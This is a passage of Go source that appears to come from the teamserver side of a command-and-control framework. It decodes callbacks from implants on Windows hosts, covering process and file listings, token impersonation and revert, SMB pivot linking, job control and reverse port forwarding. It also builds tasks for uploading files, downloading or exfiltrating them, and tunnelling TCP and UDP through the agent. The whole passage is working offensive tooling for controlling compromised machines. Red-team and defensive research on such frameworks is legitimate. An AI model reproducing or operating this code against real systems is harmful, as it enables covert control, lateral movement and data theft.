				task.ClearText = "Symbol not found: " + output + "\n"

			} else if outputType == CALLBACK_ERROR {
				task.MessageType = MESSAGE_ERROR
				task.Message = "BOF output"
				task.ClearText = ConvertCpToUTF8(output, agentData.ACP)

			} else if outputType == CALLBACK_OUTPUT_OEM {
				task.MessageType = MESSAGE_SUCCESS
				task.Message = "BOF output"
				task.ClearText = ConvertCpToUTF8(output, agentData.OemCP)

			} else {
				task.MessageType = MESSAGE_SUCCESS
				task.Message = "BOF output"
				task.ClearText = ConvertCpToUTF8(output, agentData.ACP)
			}

			task.Completed = false

		case COMMAND_GETUID:
			if false == packer.CheckPacker([]string{"byte", "byte", "array", "array"}) {
				return outTasks
			}

			gui := packer.ParseInt8()
			high := packer.ParseInt8()
			domain := ConvertCpToUTF8(packer.ParseString(), agentData.ACP)
			username := ConvertCpToUTF8(packer.ParseString(), agentData.ACP)
			message := ""
			elevated := false

			if username != "" {
				if domain != "" {
					username = domain + "\\" + username
				}
				message = fmt.Sprintf("You are '%v'", username)
				if high > 0 {
					message += " (elevated)"
					elevated = true
				}
			}
			task.Message = message

			if gui > 0 {
				_ = ts.TsAgentImpersonate(agentData.Id, username, elevated)
			}

		case COMMAND_JOB:
			if false == packer.CheckPacker([]string{"byte"}) {
				return outTasks
			}

			state := packer.ParseInt8()
			if state == JOB_STATE_RUNNING {
				if false == packer.CheckPacker([]string{"array"}) {
					return outTasks
				}
				task.Completed = false
				jobOutput := ConvertCpToUTF8(packer.ParseString(), agentData.OemCP)
				task.Message = fmt.Sprintf("Job [%v] output:", task.TaskId)
				task.ClearText = jobOutput
			} else if state == JOB_STATE_KILLED {
				task.Completed = true
				task.MessageType = MESSAGE_INFO
				task.Message = fmt.Sprintf("Job [%v] canceled", task.TaskId)
			} else if state == JOB_STATE_FINISHED {
				task.Completed = true
				task.Message = fmt.Sprintf("Job [%v] finished", task.TaskId)
			}

		case COMMAND_JOB_LIST:
			var Output string
			if false == packer.CheckPacker([]string{"int"}) {
				return outTasks
			}
			count := packer.ParseInt32()

			if count > 0 {
				Output += fmt.Sprintf(" %-10s  %-5s  %-13s\n", "JobID", "PID", "Type")
				Output += fmt.Sprintf(" %-10s  %-5s  %-13s", "--------", "-----", "-------")
				for i := 0; i < int(count); i++ {
					if false == packer.CheckPacker([]string{"int", "word", "word"}) {
						return outTasks
					}
					jobId := fmt.Sprintf("%08x", packer.ParseInt32())
					jobType := packer.ParseInt16()
					pid := packer.ParseInt16()

					stringType := "Unknown"
					if jobType == 0x1 {
						stringType = "Local"
					} else if jobType == 0x2 {
						stringType = "Remote"
					} else if jobType == 0x3 {
						stringType = "Process"
					}
					Output += fmt.Sprintf("\n %-10v  %-5v  %-13s", jobId, pid, stringType)
				}
				task.Message = "Job list:"
				task.ClearText = Output
			} else {
				task.Message = "No active jobs"
			}

		case COMMAND_JOBS_KILL:
			if false == packer.CheckPacker([]string{"byte", "int"}) {
				return outTasks
			}
			result := packer.ParseInt8()
			jobId := packer.ParseInt32()

			if result == 0 {
				task.MessageType = MESSAGE_ERROR
				task.Message = fmt.Sprintf("Job %v not found", jobId)
			} else {
				task.Message = fmt.Sprintf("Job %v mark as Killed", jobId)
			}

		case COMMAND_LINK:
			if false == packer.CheckPacker([]string{"byte", "int", "array"}) {
				return outTasks
			}

			linkType := packer.ParseInt8()
			watermark := fmt.Sprintf("%08x", packer.ParseInt32())
			beat := packer.ParseBytes()

			childAgentId, _ := ts.TsListenerInteralHandler(watermark, beat)
			_ = ts.TsPivotCreate(task.TaskId, agentData.Id, childAgentId, "", false)

			if linkType == 1 {
				task.Message = fmt.Sprintf("----- New SMB pivot agent: [%s]===[%s] -----", agentData.Id, childAgentId)
				ts.TsAgentConsoleOutput(childAgentId, MESSAGE_SUCCESS, task.Message, "\n", true)
			}

		case COMMAND_LS:
			if false == packer.CheckPacker([]string{"byte"}) {
				return outTasks
			}
			result := packer.ParseInt8()

			var items []ListingFileData
			var rootPath string

			if result == 0 {
				if false == packer.CheckPacker([]string{"int"}) {
					return outTasks
				}
				errorCode := packer.ParseInt32()
				task.Message = fmt.Sprintf("Error [%d]: %s", errorCode, win32ErrorCodes[errorCode])
				task.MessageType = MESSAGE_ERROR

			} else {
				if false == packer.CheckPacker([]string{"array", "int"}) {
					return outTasks
				}
				rootPath = ConvertCpToUTF8(packer.ParseString(), agentData.ACP)
				rootPath, _ = strings.CutSuffix(rootPath, "\\*")

				filesCount := int(packer.ParseInt32())

				if filesCount == 0 {
					task.Message = fmt.Sprintf("The '%s' directory is EMPTY", rootPath)
				} else {

					var folders []ListingFileData
					var files []ListingFileData

					for i := 0; i < filesCount; i++ {
						if false == packer.CheckPacker([]string{"byte", "long", "int", "array"}) {
							return outTasks
						}
						isDir := packer.ParseInt8()
						fileData := ListingFileData{
							IsDir:    false,
							Size:     int64(packer.ParseInt64()),
							Date:     int64(packer.ParseInt32()),
							Filename: ConvertCpToUTF8(packer.ParseString(), agentData.ACP),
						}
						if isDir > 0 {
							fileData.IsDir = true
							folders = append(folders, fileData)
						} else {
							files = append(files, fileData)
						}
					}

					items = append(folders, files...)

					OutputText := fmt.Sprintf(" %-8s %-14s %-20s  %s\n", "Type", "Size", "Last Modified      ", "Name")
					OutputText += fmt.Sprintf(" %-8s %-14s %-20s  %s", "----", "---------", "----------------   ", "----")

					for _, item := range items {
						t := time.Unix(item.Date, 0).UTC()
						lastWrite := fmt.Sprintf("%02d/%02d/%d %02d:%02d", t.Day(), t.Month(), t.Year(), t.Hour(), t.Minute())

						if item.IsDir {
							OutputText += fmt.Sprintf("\n %-8s %-14s %-20s  %-8v", "dir", "", lastWrite, item.Filename)
						} else {
							OutputText += fmt.Sprintf("\n %-8s %-14s %-20s  %-8v", "", SizeBytesToFormat(item.Size), lastWrite, item.Filename)
						}
					}
					task.Message = fmt.Sprintf("List of files in the '%s' directory", rootPath)
					task.ClearText = OutputText
				}
			}

			SyncBrowserFiles(ts, task, rootPath, items)

		case COMMAND_MKDIR:
			if false == packer.CheckPacker([]string{"array"}) {
				return outTasks
			}
			path := ConvertCpToUTF8(packer.ParseString(), agentData.ACP)
			task.Message = fmt.Sprintf("Directory '%v' created successfully", path)

		case COMMAND_MV:
			task.Message = "File moved successfully"

		case COMMAND_PIVOT_EXEC:
			if false == packer.CheckPacker([]string{"int", "array"}) {
				return outTasks
			}

			pivotId := fmt.Sprintf("%08x", packer.ParseInt32())
			pivotData := packer.ParseBytes()

			_, _, childAgentId := ts.TsGetPivotInfoById(pivotId)

			_ = ts.TsAgentProcessData(childAgentId, pivotData)

		case COMMAND_PROFILE:
			if false == packer.CheckPacker([]string{"int"}) {
				return outTasks
			}
			subcommand := packer.ParseInt32()

			if subcommand == 1 {
				if false == packer.CheckPacker([]string{"int", "int"}) {
					return outTasks
				}
				sleep := packer.ParseInt32()
				jitter := packer.ParseInt32()

				agentData.Sleep = sleep
				agentData.Jitter = jitter

				task.Message = "Sleep time has been changed"

				var buffer bytes.Buffer
				_ = json.NewEncoder(&buffer).Encode(agentData)

				_ = ts.TsAgentUpdateData(buffer.Bytes())

			} else if subcommand == 2 {
				if false == packer.CheckPacker([]string{"int"}) {
					return outTasks
				}
				size := packer.ParseInt32()
				task.Message = fmt.Sprintf("Download chunk size set to %v bytes", size)
			}

		case COMMAND_PS_LIST:
			if false == packer.CheckPacker([]string{"byte", "int"}) {
				return outTasks
			}

			result := packer.ParseInt8()

			var proclist []ListingProcessData

			if result == 0 {
				errorCode := packer.ParseInt32()
				task.Message = fmt.Sprintf("Error [%d]: %s", errorCode, win32ErrorCodes[errorCode])
				task.MessageType = MESSAGE_ERROR

			} else {
				processCount := int(packer.ParseInt32())

				if processCount == 0 {
					task.Message = "Failed to get process list"
					task.MessageType = MESSAGE_ERROR
					break
				}

				contextMaxSize := 10

				for i := 0; i < processCount; i++ {
					if false == packer.CheckPacker([]string{"word", "word", "word", "byte", "byte", "array", "array", "array"}) {
						return outTasks
					}
					procData := ListingProcessData{
						Pid:       uint(packer.ParseInt16()),
						Ppid:      uint(packer.ParseInt16()),
						SessionId: uint(packer.ParseInt16()),
						Arch:      "",
					}

					isArch64 := packer.ParseInt8()
					if isArch64 == 0 {
						procData.Arch = "x32"
					} else if isArch64 == 1 {
						procData.Arch = "x64"
					}

					elevated := packer.ParseInt8()
					domain := ConvertCpToUTF8(packer.ParseString(), agentData.ACP)
					username := ConvertCpToUTF8(packer.ParseString(), agentData.ACP)

					if username != "" {
						procData.Context = username
						if domain != "" {
							procData.Context = domain + "\\" + username
						}
						if elevated > 0 {
							procData.Context += " *"
						}

						if len(procData.Context) > contextMaxSize {
							contextMaxSize = len(procData.Context)
						}
					}

					procData.ProcessName = ConvertCpToUTF8(packer.ParseString(), agentData.ACP)

					proclist = append(proclist, procData)
				}

				format := fmt.Sprintf(" %%-5v   %%-5v   %%-7v   %%-5v   %%-%vv   %%-7v", contextMaxSize)
				OutputText := fmt.Sprintf(format, "PID", "PPID", "Session", "Arch", "Context", "Process")
				OutputText += fmt.Sprintf("\n"+format, "---", "----", "-------", "----", "-------", "-------")

				for _, item := range proclist {
					OutputText += fmt.Sprintf("\n"+format, item.Pid, item.Ppid, item.SessionId, item.Arch, item.Context, item.ProcessName)
				}
				task.Message = "Process list:"
				task.ClearText = OutputText
			}

			SyncBrowserProcess(ts, task, proclist)

		case COMMAND_PS_KILL:
			if false == packer.CheckPacker([]string{"int"}) {
				return outTasks
			}
			pid := packer.ParseInt32()
			task.Message = fmt.Sprintf("Process %d killed", pid)

		case COMMAND_PS_RUN:
			if false == packer.CheckPacker([]string{"int", "byte", "array"}) {
				return outTasks
			}
			pid := packer.ParseInt32()
			isOutput := packer.ParseInt8()
			prog := ConvertCpToUTF8(packer.ParseString(), agentData.ACP)

			status := "no output"
			if isOutput > 0 {
				status = "with output"
			}

			task.Completed = false
			task.Message = fmt.Sprintf("Program %v started with PID %d (output - %v)", prog, pid, status)

		case COMMAND_PWD:
			if false == packer.CheckPacker([]string{"array"}) {
				return outTasks
			}
			path := ConvertCpToUTF8(packer.ParseString(), agentData.ACP)
			task.Message = "Current working directory:"
			task.ClearText = path

		case COMMAND_REV2SELF:
			if false == packer.CheckPacker([]string{"byte"}) {
				return outTasks
			}

			gui := packer.ParseInt8()
			if gui == 1 {
				task.Message = "Token reverted successfully"
			}
			_ = ts.TsAgentImpersonate(agentData.Id, "", agentData.Elevated)

		case COMMAND_RM:
			if false == packer.CheckPacker([]string{"byte"}) {
				return outTasks
			}
			result := packer.ParseInt8()
			if result == 0 {
				task.Message = "File deleted successfully"
			} else {
				task.Message = "Directory deleted successfully"
			}

		case COMMAND_TUNNEL_START_TCP:
			if false == packer.CheckPacker([]string{"byte"}) {
				return outTasks
			}

			channelId := int(TaskId)
			result := packer.ParseInt8()
			if result == 0 {
				ts.TsTunnelConnectionClose(channelId)
			} else {
				ts.TsTunnelConnectionResume(agentData.Id, channelId)
			}

		case COMMAND_TUNNEL_WRITE_TCP:
			if false == packer.CheckPacker([]string{"array"}) {
				return outTasks
			}

			channelId := int(TaskId)
			data := packer.ParseBytes()
			ts.TsTunnelConnectionData(channelId, data)

		case COMMAND_TUNNEL_REVERSE:
			if false == packer.CheckPacker([]string{"byte"}) {
				return outTasks
			}
			var err error
			tunnelId := int(TaskId)
			result := packer.ParseInt8()
			if result == 0 {
				task.TaskId, task.Message, err = ts.TsTunnelStateRemotePortFwd(tunnelId, false)
			} else {
				task.TaskId, task.Message, err = ts.TsTunnelStateRemotePortFwd(tunnelId, true)
			}

			if err != nil {
				task.MessageType = MESSAGE_ERROR
			} else {
				task.MessageType = MESSAGE_SUCCESS
			}

		case COMMAND_TUNNEL_ACCEPT:
			if false == packer.CheckPacker([]string{"int"}) {
				return outTasks
			}
			tunnelId := int(TaskId)
			channelId := int(packer.ParseInt32())
			ts.TsTunnelConnectionAccept(tunnelId, channelId)

		case COMMAND_TERMINATE:
			if false == packer.CheckPacker([]string{"int"}) {
				return outTasks
			}
			exitMethod := packer.ParseInt32()
			if exitMethod == 1 {
				task.Message = "The agent has completed its work (kill thread)"
			} else if exitMethod == 2 {
				task.Message = "The agent has completed its work (kill process)"
			}

			_ = ts.TsAgentTerminate(agentData.Id, task.TaskId)

		case COMMAND_UNLINK:
			if false == packer.CheckPacker([]string{"int", "byte"}) {
				return outTasks
			}

			pivotId := fmt.Sprintf("%08x", packer.ParseInt32())
			pivotType := packer.ParseInt8()

			messageParent := ""
			messageChild := ""
			_, parentAgentId, childAgentId := ts.TsGetPivotInfoById(pivotId)

			if pivotType == 1 {
				messageParent = fmt.Sprintf("SMB agent disconnected %s", childAgentId)
				messageChild = fmt.Sprintf(" ----- SMB agent disconnected from [%s] ----- ", parentAgentId)
			} else if pivotType == 10 {
				messageParent = fmt.Sprintf("Pivot agent %s connection reset", childAgentId)
				messageChild = fmt.Sprintf(" ----- Pivot agent connection reset ----- ")
			}

			if pivotType != 0 {
				_ = ts.TsPivotDelete(pivotId)
				if TaskId == 0 {
					ts.TsAgentConsoleOutput(parentAgentId, MESSAGE_SUCCESS, messageParent, "\n", true)
				} else {
					task.Message = messageParent
				}
				ts.TsAgentConsoleOutput(childAgentId, MESSAGE_SUCCESS, messageChild, "\n", true)
			}

		case COMMAND_UPLOAD:
			task.Message = "File successfully uploaded"
			SyncBrowserFilesStatus(ts, task)

		case COMMAND_ERROR:
			if false == packer.CheckPacker([]string{"int"}) {
				return outTasks
			}
			errorCode := packer.ParseInt32()
			task.Message = fmt.Sprintf("Error [%d]: %s", errorCode, win32ErrorCodes[errorCode])
			task.MessageType = MESSAGE_ERROR

		default:
			continue
		}

		outTasks = append(outTasks, task)
	}
	return outTasks
}

/// BROWSERS

func BrowserDownloadChangeState(fid string, newState int) ([]byte, error) {
	fileId, err := strconv.ParseInt(fid, 16, 64)
	if err != nil {
		return nil, err
	}

	array := []interface{}{COMMAND_EXFIL, newState, int(fileId)}

	return PackArray(array)
}

func BrowserDisks(agentData AgentData) ([]byte, error) {
	array := []interface{}{COMMAND_DISKS}
	return PackArray(array)
}

func BrowserProcess(agentData AgentData) ([]byte, error) {
	array := []interface{}{COMMAND_PS_LIST}
	return PackArray(array)
}

func BrowserFiles(path string, agentData AgentData) ([]byte, error) {
	dir := ConvertUTF8toCp(path, agentData.ACP)
	array := []interface{}{COMMAND_LS, dir}
	return PackArray(array)
}

func BrowserUpload(ts Teamserver, path string, content []byte, agentData AgentData) ([]byte, error) {
	memoryId := CreateTaskCommandSaveMemory(ts, agentData.Id, content)
	fileName := ConvertUTF8toCp(path, agentData.ACP)
	array := []interface{}{COMMAND_UPLOAD, memoryId, fileName}
	return PackArray(array)
}

func BrowserDownload(path string, agentData AgentData) ([]byte, error) {
	array := []interface{}{COMMAND_DOWNLOAD, ConvertUTF8toCp(path, agentData.ACP)}
	return PackArray(array)
}

func BrowserJobKill(jobId string) ([]byte, error) {
	jobIdstr, err := strconv.ParseInt(jobId, 16, 64)
	if err != nil {
		return nil, err
	}

	array := []interface{}{COMMAND_JOBS_KILL, int(jobIdstr)}
	return PackArray(array)
}

func BrowserExit(agentData AgentData) ([]byte, error) {
	array := []interface{}{COMMAND_TERMINATE, 2}
	return PackArray(array)
}

/// TUNNELS

func TunnelCreateTCP(channelId int, address string, port int) ([]byte, error) {
	array := []interface{}{COMMAND_TUNNEL_START_TCP, channelId, address, port}
	return PackArray(array)
}

func TunnelCreateUDP(channelId int, address string, port int) ([]byte, error) {
	array := []interface{}{COMMAND_TUNNEL_START_UDP, channelId, address, port}
	return PackArray(array)
}

func TunnelWriteTCP(channelId int, data []byte) ([]byte, error) {
	array := []interface{}{COMMAND_TUNNEL_WRITE_TCP, channelId, len(data), data}
	return PackArray(array)
}

func TunnelWriteUDP(channelId int, data []byte) ([]byte, error) {
	array := []interface{}{COMMAND_TUNNEL_WRITE_UDP, channelId, len(data), data}
	return PackArray(array)
}

func TunnelClose(channelId int) ([]byte, error) {
	array := []interface{}{COMMAND_TUNNEL_CLOSE, channelId}
	return PackArray(array)
}

func TunnelReverse(tunnelId int, port int) ([]byte, error) {
	array := []interface{}{COMMAND_TUNNEL_REVERSE, tunnelId, port}
	return PackArray(array)
}
